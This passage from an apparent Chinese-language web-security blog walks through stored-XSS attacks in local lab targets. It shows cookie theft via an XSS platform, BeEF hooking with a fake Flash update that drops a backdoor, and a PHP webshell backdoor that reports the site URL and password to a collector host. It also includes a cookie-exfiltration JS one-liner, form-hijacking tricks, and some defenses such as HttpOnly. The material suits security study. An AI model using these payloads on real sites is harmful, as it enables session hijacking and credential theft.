<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL：http://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1</span><br><span class="line">Cookie：valueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95</span><br></pre></td></tr></table></figure>

<p>用获取到的cookie和后台链接，使用firebug进行设置</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642588748924-d0e9ea87-cb78-41db-9821-9b36f1d513ea.png" alt="img"></p>
<p>成功进入后台！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642588777560-e0db8613-7b32-49b1-a574-644584b5467a.png" alt="img"></p>
<p>&emsp;&emsp;注意：因为是留言板，因此别人查看我们留下的XSS攻击代码时，也会记录到XSS平台，因此查看XSS平台的记录时注意甄别访客和管理员</p>
<h2 id="2、BUUCTF-basic-BUU-XSS-COURSE-1"><a href="#2、BUUCTF-basic-BUU-XSS-COURSE-1" class="headerlink" title="2、BUUCTF-basic-BUU XSS COURSE 1"></a>2、BUUCTF-basic-BUU XSS COURSE 1</h2><ul>
<li>👉<a href="https://www.yuque.com/docs/share/d0abe6d1-1669-4d83-a4d2-6fe1e82f770d">《BUUCTF-basic-BUU XSS COURSE 1》</a>👈</li>
</ul>
<h2 id="3、订单系统——军锋真人CS野战123"><a href="#3、订单系统——军锋真人CS野战123" class="headerlink" title="3、订单系统——军锋真人CS野战123"></a>3、订单系统——军锋真人CS野战123</h2><h3 id="（1）靶场下载"><a href="#（1）靶场下载" class="headerlink" title="（1）靶场下载"></a>（1）靶场下载</h3><p>链接：<a href="https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg">https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg</a> ，提取码：rtra</p>
<h3 id="（2）靶场安装"><a href="#（2）靶场安装" class="headerlink" title="（2）靶场安装"></a>（2）靶场安装</h3><p>注意下载安装好后仔细查看安装说明，比如config.php的数据库账密要对，否则连接不上数据库</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642580308516-a6afe0af-1855-4459-91a3-0cd6398fdc44.png" alt="img"></p>
<p>如果访问install.php提示以下信息，按照提示操作即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642494006091-30d37362-f661-43d0-91cf-c370af5bc484.png" alt="img"></p>
<p>在真实机部署环境时出现了一系列问题（后台登录页面验证码无法显示），我是在Win7虚拟机，PHP版本为5.3.29部署成功的</p>
<h3 id="（3）进行攻击-1"><a href="#（3）进行攻击-1" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试-1"><a href="#①-初次尝试-1" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>攻击者在具体要求一栏构造payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581499917-265ec4b0-571d-4613-bffb-b9fcc657973f.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581536144-93a5edf8-855e-4cba-a597-0833bb447a18.png" alt="img"></p>
<p>管理员在后台进行查看时就会弹出弹窗</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581556614-2a2dd0cd-cf4e-4f9e-a2a0-1c8502afff3c.png" alt="img"></p>
<p>正是因为我们的JS代码嵌入到了其中</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581588656-bfc1eac5-ae2b-4dae-a96b-6138503f0a56.png" alt="img"></p>
<h4 id="②-XSS平台获取cookie"><a href="#②-XSS平台获取cookie" class="headerlink" title="② XSS平台获取cookie"></a>② XSS平台获取cookie</h4><p>选择XSS平台的攻击代码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581730045-dba41c28-6995-42e1-9754-70c35d1c3b8d.png" alt="img"></p>
<p>提交</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581785151-e1fb52f4-f518-476f-9e8d-b1da72d0971a.png" alt="img"></p>
<p>管理员在后台查看时就会触发攻击代码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642581946591-6a73dfb7-f0a4-4322-a99b-bce6f7bdd1ba.png" alt="img"></p>
<p>此时在XSS平台就能查看到获取的信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642582000244-7ab4ae89-b3e4-4591-8ed3-4b1d40f0c06c.png" alt="img"></p>
<h4 id="③-postman登录后台"><a href="#③-postman登录后台" class="headerlink" title="③ postman登录后台"></a>③ postman登录后台</h4><p>postman下载地址：<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642582243728-f4436c0b-5d64-4c04-8c0c-fa885ecf5e42.png" alt="img"></p>
<h3 id="（4）Beef结合XSS攻击"><a href="#（4）Beef结合XSS攻击" class="headerlink" title="（4）Beef结合XSS攻击"></a>（4）Beef结合XSS攻击</h3><h4 id="①-安装Beef-xss"><a href="#①-安装Beef-xss" class="headerlink" title="① 安装Beef-xss"></a>① 安装Beef-xss</h4><p>最新版kali安装beef-xss</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure>

<p>如果遇到找不到包</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643096539754-21bda98b-598d-4459-8622-1770f7d23dda.png" alt="img"></p>
<p>解决方案</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑文件</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加旧的资源信息</span></span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://http.kali.org/kali kali-rolling main contrib non-free</span></span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://http.kali.org/kali sana main non-free contrib</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://security.kali.org/kali-security sana/updates main contrib non-free</span></span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"><span class="meta">#</span><span class="bash"> For <span class="built_in">source</span> package access, uncomment the following line</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb-src http://old.kali.org/kali moto main non-free contrib</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更新资源列表</span></span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>更新完毕后重新安装目标应用即可</p>
<p>安装完成后，直接使用beef-xss启动会有启动失败的问题，目前还不知道解决方法</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097035828-2ddbcefa-8e70-497b-b60c-130e7dec2e83.png" alt="img"></p>
<p>但是可以进入<code>/usr/share/beef-xss/</code>目录，使用<code>./beef</code>启动即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097095455-ffd7a7f4-e346-425a-99ca-eb9e6e5f86d7.png" alt="img"></p>
<p>如果需要修改登录账号密码可以修改config.yaml文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097262651-17dcf038-1429-43e6-8cc3-62f6c2e682a1.png" alt="img"></p>
<h4 id="②-使用beef-xss"><a href="#②-使用beef-xss" class="headerlink" title="② 使用beef-xss"></a>② 使用beef-xss</h4><p>启动beef后，插入钩子，提交</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097866129-ca2a93fb-adaa-484d-b2a9-27c925c0fef9.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643097981740-ea8eb9fe-9686-4816-9ece-c87c3199a2d7.png" alt="img"></p>
<p>后台管理员查看订单触发XSS</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098123473-ff9d17eb-5a89-49b6-8147-739ebb4000b2.png" alt="img"></p>
<p>成功上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098170223-a0e5e9ab-5960-4f02-9184-ed79e9680afc.png" alt="img"></p>
<p>获取Cookie</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098518585-9e1894b4-af38-4572-b9b3-abcf58f21b28.png" alt="img"></p>
<p>浏览器跳转</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098749436-2aa796a8-72f0-4f19-9d64-965a68fe9ae3.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643098784610-7fc93af8-c9fa-48f0-b2c5-dc8214c42f45.png" alt="img"></p>
<p>社工攻击，利用模拟Flash更新向客户端发送请求，来实现下载后门</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643099134753-5a07daab-7fa1-4c20-a0dc-fdb192c443e4.png" alt="img"></p>
<p>客户端显示，点击就下载后门</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643099551419-bc0c0559-bf20-4c30-b85c-2cc61b5f7b23.png" alt="img"></p>
<h2 id="4、WebShell箱子管理系统"><a href="#4、WebShell箱子管理系统" class="headerlink" title="4、WebShell箱子管理系统"></a>4、WebShell箱子管理系统</h2><p>&emsp;&emsp;就是使用别人的webshell来进行获取服务器shell，但获取shell后<strong>webshell</strong>存在的<strong>恶意代码</strong>就会把网站信息和webshell密码，和用户名发到webshell的原主人来进行<strong>信息收集</strong>，通过大量获取的网站shell来进行<strong>贩卖</strong>，而使用webshell的人就成<strong>打工仔</strong>了。</p>
<p>&emsp;&emsp;反杀的意思就是像上面的<strong>窃取cookie</strong>道理一样通过向webshell的代码中插入窃取cookie的代码，当webshell 原注入查看沙箱时就会触发xss窃取cookie来达到<strong>反客为主</strong>！</p>
<p>&emsp;&emsp;既然说到了WebShell，推荐一个WebShell库：<a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>
<h3 id="（1）搭建靶场-1"><a href="#（1）搭建靶场-1" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><h4 id="①-靶场下载"><a href="#①-靶场下载" class="headerlink" title="① 靶场下载"></a>① 靶场下载</h4><p>靶场下载：链接：<a href="https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA">https://pan.baidu.com/s/1ym_f9HDjejY2YLAMJmtAKA</a> </p>
<p>提取码：gay7</p>
<h4 id="②-小旋风下载"><a href="#②-小旋风下载" class="headerlink" title="② 小旋风下载"></a>② 小旋风下载</h4><p>&emsp;&emsp;搭建一个asp的服务器，我们这里选用小旋风进行搭建<a href="http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%8C%E6%88%90%E5%90%8E%E8%A7%A3%E5%8E%8B%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%87%8C%E9%9D%A2">http://lt.yx12345.com:90/yasuobao/jyx12345xiaoxuanfenglinshiaspfuwuqiminiban.zip，下载完成后解压到虚拟机里面</a></p>
<p>&emsp;&emsp;默认端口为80。如果80端口被占用或不想用80可用记事本打开host.ini增加端口网站服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642592780643-1764bf55-8d20-4531-bc41-1a4c677c4af3.png" alt="img"></p>
<h4 id="③-靶场搭建"><a href="#③-靶场搭建" class="headerlink" title="③ 靶场搭建"></a>③ 靶场搭建</h4><p>&emsp;&emsp;将下载好的webshell箱子放在搭建好的服务器里面，这里我放到了8001端口下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642669805289-fd721f49-4fad-46cf-8206-ef3231fed691.png" alt="img"></p>
<p>&emsp;&emsp;这里存在一个问题，访问该网址时只能访问<a href="http://localhost:8001/xxx">http://localhost:8001/xxx</a> ，访问127.0.0.1或者内网IP地址都会报<strong>418 Host Not Found</strong>的错误</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670016865-06b48d0e-8286-4a3c-b18d-2fce563e0e36.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670036004-d215c14e-bbeb-4157-98f6-9f8735a675a6.png" alt="img"></p>
<p>&emsp;&emsp;经过排查终于知道是哪里出了问题，只需要将这里修改成对应的IP地址，重启服务即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670201987-af395cea-a729-4284-a7c2-50fa69b26692.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642670311105-27944ed0-53b3-4523-9a0e-d173d7cb7353.png" alt="img"></p>
<p>&emsp;&emsp;假如我们向wolke.cn传入了别人留了后门的木马，进行连接，访问了<a href="http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1">http://10.3.14.17:8001/api.asp?url=wolke.cn&amp;pass=sqzr&amp;id=1</a> ，这个时候别人在后台就能看到我们的webshell，坐收渔翁之利</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643074868151-e027a9a9-a485-4122-b713-56ed91fa0cb5.png" alt="img"></p>
<h3 id="（2）进行攻击"><a href="#（2）进行攻击" class="headerlink" title="（2）进行攻击"></a>（2）进行攻击</h3><h4 id="①-模拟webshell原作者进行后门攻击"><a href="#①-模拟webshell原作者进行后门攻击" class="headerlink" title="① 模拟webshell原作者进行后门攻击"></a>① 模拟webshell原作者进行后门攻击</h4><p>&emsp;&emsp;登录后台（账号密码都为：admin）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642671535760-1a25ef10-8827-4ea7-a515-26c9ea604301.png" alt="img"></p>
<p>&emsp;&emsp;去找一个免杀WebShell，然后加上我自己的后门</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;sqzr&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]; <span class="comment">// HTTP_HOST当前请求头中 Host: 项的内容；PHP_SELF当前执行脚本的文件名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script src=&#x27;http://10.3.14.17:8001/api.asp?url=<span class="subst">$url</span>&amp;pass=<span class="subst">$password</span>&amp;id=1&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642672998635-37fec6eb-5bfc-438a-a163-4e9b351820d4.png" alt="img"></p>
<p>&emsp;&emsp;模拟上传WebShell到某网站，并且进行连接触发后门</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643078077076-dfd054a0-00b7-4d59-a77f-90bd82df3a67.png" alt="img"></p>
<p>&emsp;&emsp;这时我们就打开webshell箱子发现我们的后门了（实验时发现木马路径太长，即使触发了后门也无法记录到webshell箱子中去）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643078142747-4cec5494-d3ec-4b75-a66c-6caaa203d780.png" alt="img"></p>
<h4 id="②-反杀webshell原作者"><a href="#②-反杀webshell原作者" class="headerlink" title="② 反杀webshell原作者"></a>② 反杀webshell原作者</h4><p>&emsp;&emsp;有的webshell原作者会利用加密、编码、拼接字符等技术来隐藏URL，因此我们使用别人的webshell时一定要进行代码审计</p>
<p>&emsp;&emsp;当我们代码审计获取到webshell沙箱的URL后，通过访问webshell沙箱来植入XSS代码窃取cookie</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643089816152-07a33c59-5664-451d-9295-8621319a6055.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643093762196-72586c8d-af4f-427e-8fb4-1db7b512fcd1.png" alt="img"></p>
<p>&emsp;&emsp;此时沙箱管理员查看PHP信封，就会看到我们的恶意数据，同时也会触发XSS攻击代码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643093818121-92151e61-b88d-434a-840a-440626bd2179.png" alt="img"></p>
<p>&emsp;&emsp;XSS平台新增记录</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643094222847-673d4263-d91d-4cd0-9806-be09d077f62c.png" alt="img"></p>
<p>&emsp;&emsp;使用postman进入后台，直接反杀</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643094461130-4c99b0e6-b633-4730-9ff7-d5528ed941b7.png" alt="img"></p>
<h2 id="5、使用JS代码获取Cookie"><a href="#5、使用JS代码获取Cookie" class="headerlink" title="5、使用JS代码获取Cookie"></a>5、使用JS代码获取Cookie</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);img.src=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);&lt;script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="六、XSS攻击的检测"><a href="#六、XSS攻击的检测" class="headerlink" title="六、XSS攻击的检测"></a>六、XSS攻击的检测</h1><ol>
<li><p>在目标站点上找到输入点，比如搜索栏，错误页面，留言板等。  </p>
</li>
<li><p>输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否做对应的处理。  </p>
</li>
<li><p>通过搜索定位到唯一识别字符，结合唯一识别字符前后语法确认是否可以构造执行js的条件(构造闭合)。  </p>
</li>
<li><p>提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明该站点存在XSS漏洞。  </p>
</li>
</ol>
<p><strong>Tips：</strong></p>
<ol>
<li><p>通常搜索栏容易出现反射型XSS，留言板容易出现存储型XSS；  </p>
</li>
<li><p>有些网站鉴于后台可能存在过滤措施，组建的script可能会被过滤掉，因而无法生效或者环境限制脚本执行；</p>
</li>
<li><p>通过变化不同的script，尝试绕过后台的过滤机制。</p>
</li>
</ol>
<p> <strong>下图为跨站脚本攻击流程图（Cookies）</strong>  </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626871022792-dd640019-7a60-49ab-85ce-31a2d88f30a8.png" alt="img"></p>
<p>&emsp;&emsp;从图中可以看出：用户访问存在XSS漏洞的站点后触发脚本，漏洞站点给用户返回带有恶意js的页面；用户设备执行该恶意脚本后，攻击者即可窃取用户的数据（cookies），并伪装成用户对漏洞站点进行攻击。</p>
<h1 id="七、获取Session思路"><a href="#七、获取Session思路" class="headerlink" title="七、获取Session思路"></a>七、获取Session思路</h1><p>&emsp;&emsp;有的时候获取了Cookie，但是少了Session，会造成登不进后台</p>
<p>&emsp;&emsp;服务器开启了Session验证的话，我们只获取客户端的Cookie是没有办法通过验证的，</p>
<p>&emsp;&emsp;而且我们也无法获取存放在服务端的Session</p>
<p>&emsp;&emsp;如果需要获取Session，可以借助辅助文件，比如访问php探针时就会携带Session</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643103631251-09c4a5a7-6a09-4604-b8ef-3b1664d1f527.png" alt="img"></p>
<p>&emsp;&emsp;如果能利用XSS让管理员页面跳转到phpinfo()界面，通过返回源码就能窃取Session</p>
<p>&emsp;&emsp;利用beef进行页面跳转</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105102796-2364734e-007f-4a38-90cb-0bd3b599d93f.png" alt="img"></p>
<p>&emsp;&emsp;获取页面源码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105121154-1858829c-ef1a-4453-ae0e-eaeb8840c558.png" alt="img"></p>
<p>&emsp;&emsp;获取源码中的cookie和session</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643105141117-67d9b256-2e63-4124-ac81-bd40b60ea462.png" alt="img"></p>
<h1 id="八、HttpOnly"><a href="#八、HttpOnly" class="headerlink" title="八、HttpOnly"></a>八、HttpOnly</h1><h2 id="1、什么是HttpOnly"><a href="#1、什么是HttpOnly" class="headerlink" title="1、什么是HttpOnly"></a>1、什么是HttpOnly</h2><p>&emsp;&emsp;如果Cookie中设置了HttpOnly属性，那么通过JS脚本将无法读取到Cookie信息，这样能有效防止XSS攻击，窃取Cookie内容。 但是还是存在xss跨站语句，阻止的仅仅是获取cookie</p>
<p>&emsp;&emsp;各个主流的脚本语言都支持HttpOnly</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474645740-ff9bdf0a-d326-4d22-9b71-e70d98ceb157.png" alt="img"></p>
<h2 id="2、HttpOnly的设置样例"><a href="#2、HttpOnly的设置样例" class="headerlink" title="2、HttpOnly的设置样例"></a>2、HttpOnly的设置样例</h2><h3 id="（1）JavaEE"><a href="#（1）JavaEE" class="headerlink" title="（1）JavaEE"></a>（1）JavaEE</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.setHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;cookiename=value;</span></span><br><span class="line"><span class="string">Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;具体参数的含义再次不做阐述，设置完毕后通过js脚本是读不到该cookie的，但使用如下方式可以读取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie cookies[]=request.getCookies();  </span><br></pre></td></tr></table></figure>

<h3 id="（2）C"><a href="#（2）C" class="headerlink" title="（2）C#"></a>（2）C#</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>);   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">true</span>;   </span><br><span class="line">Response.AppendCookie(myCookie); </span><br></pre></td></tr></table></figure>

<h3 id="（3）VB-NET"><a href="#（3）VB-NET" class="headerlink" title="（3）VB.NET"></a>（3）VB.NET</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> myCookie <span class="keyword">As</span> HttpCookie = <span class="built_in">new</span> HttpCookie(<span class="string">&quot;myCookie&quot;</span>)   </span><br><span class="line">myCookie.HttpOnly = <span class="literal">True</span>   </span><br><span class="line">Response.AppendCookie(myCookie) </span><br></pre></td></tr></table></figure>

<p>但是在 .NET 1.1 ,中您需要手动添加</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">Response.Cookies[cookie].Path += <span class="string">&quot;;HTTPOnly&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="（4）PHP≥5-2"><a href="#（4）PHP≥5-2" class="headerlink" title="（4）PHP≥5.2"></a>（4）PHP≥5.2</h3><p>&emsp;&emsp;PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.cookie_httponly = </span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性，当然也支持在代码中来开启： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ini_set(<span class="string">&quot;session.cookie_httponly&quot;</span>, <span class="number">1</span>); </span><br><span class="line"> <span class="comment">// or</span></span><br><span class="line">  session_set_cookie_params(<span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>); </span><br><span class="line">setrawcookie(<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">TRUE</span>);</span><br></pre></td></tr></table></figure>

<h3 id="（5）PHP4和PHP≤5-1"><a href="#（5）PHP4和PHP≤5-1" class="headerlink" title="（5）PHP4和PHP≤5.1"></a>（5）PHP4和PHP≤5.1</h3><p>&emsp;&emsp;对于PHP5.1以前版本以及PHP4版本的话，则需要通过header函数来变通下了： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  header(<span class="string">&quot;Set-Cookie: hidden=value; httpOnly&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="3、反制HttpOnly"><a href="#3、反制HttpOnly" class="headerlink" title="3、反制HttpOnly"></a>3、反制HttpOnly</h2><p>&emsp;&emsp;当对方开启HttpOnly时，盗取cookie就会失败。登录后台的方式有Cookie登录和账号密码登录</p>
<h3 id="（1）Cookie形式"><a href="#（1）Cookie形式" class="headerlink" title="（1）Cookie形式"></a>（1）Cookie形式</h3><h3 id="（2）直接账号密码登录"><a href="#（2）直接账号密码登录" class="headerlink" title="（2）直接账号密码登录"></a>（2）直接账号密码登录</h3><h4 id="①-读取保存账号密码"><a href="#①-读取保存账号密码" class="headerlink" title="① 读取保存账号密码"></a>① 读取保存账号密码</h4><p>&emsp;&emsp;通过窃取保存在本地的数据（账号密码）来登录后台（需要xss产生于登录地址，利用表单劫持）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474963043-18e133d0-6d66-45ab-acfd-0c560d64c2bd.png" alt="img"></p>
<p>&emsp;&emsp;type、id、name通过查看网站源代码中的登录框表单</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643474953262-42089fde-8883-4c26-b970-e08748b7e799.png" alt="img"></p>
<h4 id="②-读取没保存账号密码"><a href="#②-读取没保存账号密码" class="headerlink" title="② 读取没保存账号密码"></a>② 读取没保存账号密码</h4><p>&emsp;&emsp;通过表单（登录框）劫持数据（产生在后台的XSS，例如存储型XSS留言等）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643475025169-2a14e98f-1fb8-4ce6-a145-c62853f95eba.png" alt="img">    </p>
<p>&emsp;&emsp;劫持原理：抓取数据包另外发送一份到跨站平台</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1643475064941-75e7171d-7667-4c78-878f-7a82ef8f6f17.png" alt="img"></p>
<p>&emsp;&emsp;但是如果是https网站的话，数据是进行了ssl加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法。</p>
<h1 id="九、安全修复方案"><a href="#九、安全修复方案" class="headerlink" title="九、安全修复方案"></a>九、安全修复方案</h1><ul>
<li>开启HttpOnly</li>
<li>过滤输入：对输入进行过滤，不允许可能导致XSS攻击的字符输入</li>
<li>过滤输出：根据输出点的位置对输出到前端的内容进行适当转义</li>
<li>PHP（被阻断）：<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a></li>
<li>关于XSS漏洞修复（JAVA）：<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>青龙面板——每日自动拿京豆</title>
    <url>/post/e7b0b2b0.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>青龙面板是一个可视化的面板，在上面可以部署我们的计划任务，自动在特定时间执行京东领京豆、京喜牧场养鸡、京东特价版看视频领金币等等。</p>
<p>首先得准备一台云服务器，这里我自己在用的是腾讯云的服务器<a href="https://url.cn/mn32xpJz">https://url.cn/mn32xpJz</a> , CentOS 7，价格便宜，限制相比另外一家也少（dddd），控制台开发票也方便。</p>
